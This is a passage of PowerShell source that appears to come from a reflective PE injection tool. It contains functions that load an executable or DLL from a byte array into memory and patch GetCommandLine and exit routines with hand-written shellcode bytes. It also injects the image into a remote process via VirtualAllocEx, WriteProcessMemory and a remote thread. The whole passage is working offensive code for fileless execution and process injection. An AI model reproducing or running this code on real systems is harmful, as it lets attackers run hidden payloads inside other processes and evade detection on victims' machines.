			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)

			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize

			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}



	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,

		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)


		$ReturnArray = @()

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0

		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}

		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}




		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)

		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}


		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48
		}
		$Shellcode1 += 0xb8

		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length



		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)


		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}

		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp

		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null



		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}

		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp

		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null








		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}

				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)


				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)

				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null

				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}






		$ReturnArray = @()
		$ExitFunctions = @()


		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr


		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr

		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr


			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)

			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length

			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}


			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)



			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}


		Write-Output $ReturnArray
	}




	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}

			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null

			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}





	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,

		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)

		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants


		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)

		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{

			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{


				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}

		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,

		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])


		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types

		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}


		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}



		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}

			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}

			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}


			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}



		Write-Verbose "Allocating memory for the PE and write its headers to memory"


		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero
		$EffectivePEHandle = [IntPtr]::Zero
		if ($RemoteLoading -eq $true)
		{

			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)


			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}

		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null



		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"



		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types



		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types



		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}



		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}



		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}



		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)

				if ($PEInfo.PE64Bit -eq $true)
				{

					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{

					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem

				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)

				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}

				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}

				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{

			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr



			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}

		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}


	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)


		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types

		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants


		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)


				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
